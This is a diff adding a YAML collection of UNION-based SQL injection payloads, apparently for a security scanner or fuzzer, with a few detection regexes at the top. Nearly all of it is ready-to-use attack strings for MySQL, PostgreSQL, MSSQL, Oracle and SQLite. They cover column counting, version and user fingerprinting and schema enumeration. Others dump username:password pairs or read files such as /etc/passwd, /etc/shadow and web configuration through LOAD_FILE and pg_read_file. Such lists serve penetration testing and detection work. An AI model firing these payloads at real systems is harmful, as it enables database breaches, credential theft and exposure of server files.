@@ -1,0 +1,602 @@
+metadata:
+  type: sqli/union_based
+  version: "1.0"
+  description: "UNION-based SQL injection payloads for data extraction"
+  sources: ["OWASP", "SQLMap", "PortSwigger"]
+
+detection_patterns:
+  - "(?i)union.*?select"
+  - "(?i)order\\s+by\\s+\\d+"
+  - "(?i)information_schema"
+  - "(?i)syscolumns"
+  - "(?i)sqlite_master"
+
+payloads:
+  column_enumeration:
+    - value: "' ORDER BY 1-- -"
+      description: "ORDER BY 1 column count"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 2-- -"
+      description: "ORDER BY 2"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 3-- -"
+      description: "ORDER BY 3"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 4-- -"
+      description: "ORDER BY 4"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 5-- -"
+      description: "ORDER BY 5"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 10-- -"
+      description: "ORDER BY 10"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 20-- -"
+      description: "ORDER BY 20"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 50-- -"
+      description: "ORDER BY 50"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' ORDER BY 100-- -"
+      description: "ORDER BY 100"
+      severity: medium
+      tags: [order_by, column_enum]
+
+    - value: "' UNION SELECT NULL-- -"
+      description: "UNION 1 column"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL-- -"
+      description: "UNION 2 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL-- -"
+      description: "UNION 3 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL-- -"
+      description: "UNION 4 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 5 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 6 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 7 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 8 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 9 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+      description: "UNION 10 columns"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT 1-- -"
+      description: "UNION 1 with value"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT 1,2-- -"
+      description: "UNION 2 with values"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT 1,2,3-- -"
+      description: "UNION 3 with values"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT 1,2,3,4-- -"
+      description: "UNION 4 with values"
+      severity: high
+      tags: [union, column_enum]
+
+    - value: "' UNION SELECT 1,2,3,4,5-- -"
+      description: "UNION 5 with values"
+      severity: high
+      tags: [union, column_enum]
+
+  mysql:
+    - value: "' UNION SELECT 1,@@version,3-- -"
+      description: "UNION version in column 2"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,@@version,@@version-- -"
+      description: "UNION version multiple columns"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,database(),3-- -"
+      description: "UNION database name"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,user(),3-- -"
+      description: "UNION current user"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,@@datadir,3-- -"
+      description: "UNION data directory"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,@@hostname,3-- -"
+      description: "UNION hostname"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,@@basedir,3-- -"
+      description: "UNION base directory"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -"
+      description: "UNION table names"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+      description: "UNION all tables via group_concat"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(table_name SEPARATOR '\\n'),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+      description: "UNION tables newline separated"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -"
+      description: "UNION columns from users"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
+      description: "UNION all columns via group_concat"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(column_name,0x3a,data_type),3 FROM information_schema.columns WHERE table_name='users'-- -"
+      description: "UNION columns with types"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username,3 FROM users-- -"
+      description: "UNION single username"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,password,3 FROM users-- -"
+      description: "UNION single password"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -"
+      description: "UNION dump all users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -"
+      description: "UNION dump users newline"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,concat_ws(0x3a,username,password),3 FROM users LIMIT 0,1-- -"
+      description: "UNION concat_ws first user"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
+      description: "UNION read /etc/passwd"
+      severity: critical
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3-- -"
+      description: "UNION read /etc/shadow"
+      severity: critical
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/etc/hostname'),3-- -"
+      description: "UNION read hostname file"
+      severity: high
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/proc/version'),3-- -"
+      description: "UNION read kernel version"
+      severity: high
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -"
+      description: "UNION read web config"
+      severity: critical
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,to_base64(LOAD_FILE('/etc/passwd')),3-- -"
+      description: "UNION base64 encoded file read"
+      severity: critical
+      tags: [union, file_read, base64]
+
+    - value: "' UNION ALL SELECT 1,2,3-- -"
+      description: "UNION ALL basic"
+      severity: high
+      tags: [union]
+
+    - value: "' UNION ALL SELECT 1,@@version,3-- -"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION ALL SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -"
+      description: "UNION ALL dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "-1' UNION SELECT 1,2,3-- -"
+      description: "Negative ID UNION"
+      severity: high
+      tags: [union]
+
+    - value: "0 UNION SELECT 1,@@version,3-- -"
+      description: "Zero ID UNION version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3-- -"
+      description: "UNION version with delimiter"
+      severity: critical
+      tags: [union, version]
+
+  postgresql:
+    - value: "' UNION SELECT 1,version(),3--"
+      description: "UNION version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,current_database(),3--"
+      description: "UNION current database"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,current_user,3--"
+      description: "UNION current user"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--"
+      description: "UNION all tables"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--"
+      description: "UNION all columns"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,string_agg(username||':'||password,chr(10)),3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION SELECT 1,pg_read_file('/etc/passwd'),3--"
+      description: "UNION read file via pg_read_file"
+      severity: critical
+      tags: [union, file_read]
+
+    - value: "' UNION SELECT 1,encode(pg_read_file('/etc/passwd')::bytea,'base64'),3--"
+      description: "UNION base64 file read"
+      severity: critical
+      tags: [union, file_read, base64]
+
+    - value: "' UNION ALL SELECT 1,version(),3--"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,schemaname,3 FROM pg_tables--"
+      description: "UNION schema names"
+      severity: high
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--"
+      description: "UNION public tables"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"
+      description: "UNION column names"
+      severity: critical
+      tags: [union, enumeration]
+
+  mssql:
+    - value: "' UNION SELECT 1,@@version,3--"
+      description: "UNION version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,db_name(),3--"
+      description: "UNION database name"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,system_user,3--"
+      description: "UNION system user"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,name,3 FROM master..sysdatabases--"
+      description: "UNION enumerate databases"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,name,3 FROM master..sysobjects WHERE xtype='U'--"
+      description: "UNION user tables"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--"
+      description: "UNION columns from users"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username+':'+password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION ALL SELECT 1,@@version,3--"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,table_schema+':'+table_name,3 FROM information_schema.tables--"
+      description: "UNION all tables with schema"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,column_name+':'+data_type,3 FROM information_schema.columns WHERE table_name='users'--"
+      description: "UNION columns with types"
+      severity: critical
+      tags: [union, enumeration]
+
+  oracle:
+    - value: "' UNION SELECT 1,banner,3 FROM v$version WHERE ROWNUM=1--"
+      description: "UNION version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,user,3 FROM DUAL--"
+      description: "UNION current user"
+      severity: critical
+      tags: [union]
+
+    - value: "' UNION SELECT 1,instance_name,3 FROM v$instance--"
+      description: "UNION instance name"
+      severity: high
+      tags: [union, info]
+
+    - value: "' UNION SELECT 1,table_name,3 FROM all_tables WHERE ROWNUM<=10--"
+      description: "UNION first 10 tables"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--"
+      description: "UNION columns from USERS"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username||':'||password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION ALL SELECT 1,banner,3 FROM v$version--"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,owner||':'||table_name,3 FROM all_tables WHERE ROWNUM<=10--"
+      description: "UNION tables with owner"
+      severity: critical
+      tags: [union, enumeration]
+
+  sqlite:
+    - value: "' UNION SELECT 1,sqlite_version(),3--"
+      description: "UNION version"
+      severity: critical
+      tags: [union, version]
+
+    - value: "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION table names"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION table schemas"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(name,','),3 FROM sqlite_master WHERE type='table'--"
+      description: "UNION all table names"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,group_concat(name,','),3 FROM pragma_table_info('users')--"
+      description: "UNION columns from users"
+      severity: critical
+      tags: [union, enumeration]
+
+    - value: "' UNION SELECT 1,username||':'||password,3 FROM users--"
+      description: "UNION dump users"
+      severity: critical
+      tags: [union, data_extraction]
+
+    - value: "' UNION ALL SELECT 1,sqlite_version(),3--"
+      description: "UNION ALL version"
+      severity: critical
+      tags: [union, version]
+
+  generic:
+    - value: "' UNION SELECT 1,2,3--"
+      description: "Generic UNION 3 columns"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' UNION SELECT NULL,NULL,NULL--"
+      description: "Generic UNION NULLs"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' UNION ALL SELECT 1,2,3--"
+      description: "Generic UNION ALL"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' UNION ALL SELECT NULL,NULL,NULL--"
+      description: "Generic UNION ALL NULLs"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "-1 UNION SELECT 1,2,3--"
+      description: "Negative ID UNION"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "0 UNION SELECT 1,2,3--"
+      description: "Zero ID UNION"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' UNION SELECT 1,@@version,3--"
+      description: "Generic UNION version (MySQL)"
+      severity: critical
+      tags: [union, polyglot, version]
+
+    - value: "1 UNION SELECT 1,2,3--"
+      description: "Numeric UNION"
+      severity: high
+      tags: [union, polyglot, numeric]
+
+    - value: "1' UNION SELECT 1,2,3--"
+      description: "String UNION"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "') UNION SELECT 1,2,3--"
+      description: "Parenthesis UNION"
+      severity: high
+      tags: [union, polyglot, parenthesis]
+
+    - value: "')) UNION SELECT 1,2,3--"
+      description: "Double parenthesis UNION"
+      severity: high
+      tags: [union, polyglot, parenthesis]
+
+    - value: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
+      description: "UNION 10 columns"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: "' UNION SELECT 1,2,3 ORDER BY 1--"
+      description: "UNION with ORDER BY"
+      severity: high
+      tags: [union, polyglot]
+
+    - value: " UNION SELECT 1,2,3--"
+      description: "UNION no leading quote"
+      severity: high
+      tags: [union, polyglot]
+
+  string_concatenation:
+    - value: "' UNION SELECT 1,CONCAT(username,password),3 FROM users-- -"
+      description: "MySQL CONCAT"
+      severity: critical
+      tags: [union, concatenation]
+
+    - value: "' UNION SELECT 1,CONCAT_WS(0x3a,username,password),3 FROM users-- -"
+      description: "MySQL CONCAT_WS"
+      severity: critical
+      tags: [union, concatenation]
+
+    - value: "' UNION SELECT 1,username||':'||password,3 FROM users--"
+      description: "Standard || concatenation"
+      severity: critical
+      tags: [union, concatenation]
+
+    - value: "' UNION SELECT 1,username+'-'+password,3 FROM users--"
+      description: "MSSQL + concatenation"
+      severity: critical
+      tags: [union, concatenation]
+
+    - value: "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -"
+      description: "MySQL GROUP_CONCAT"
+      severity: critical
+      tags: [union, concatenation]
+
+    - value: "' UNION SELECT 1,STRING_AGG(username||':'||password,chr(10)),3 FROM users--"
+      description: "PostgreSQL STRING_AGG"
+      severity: critical
+      tags: [union, concatenation]
+
+  type_casting:
+    - value: "' UNION SELECT 1,CAST(version() AS CHAR),3-- -"
+      description: "CAST to CHAR"
+      severity: high
+      tags: [union, type_cast]
+
+    - value: "' UNION SELECT 1,CONVERT(version(),CHAR),3-- -"
+      description: "CONVERT to CHAR"
+      severity: high
+      tags: [union, type_cast]
+
+    - value: "' UNION SELECT 1,CAST(1 AS VARCHAR(100)),3--"
+      description: "CAST int to VARCHAR"
+      severity: high
+      tags: [union, type_cast]
+
+    - value: "' UNION SELECT 1,CAST(@@version AS NVARCHAR(4000)),3--"
+      description: "MSSQL CAST to NVARCHAR"
+      severity: high
+      tags: [union, type_cast]
+
+    - value: "' UNION SELECT 1,version()::text,3--"
+      description: "PostgreSQL :: cast"
+      severity: high
+      tags: [union, type_cast]
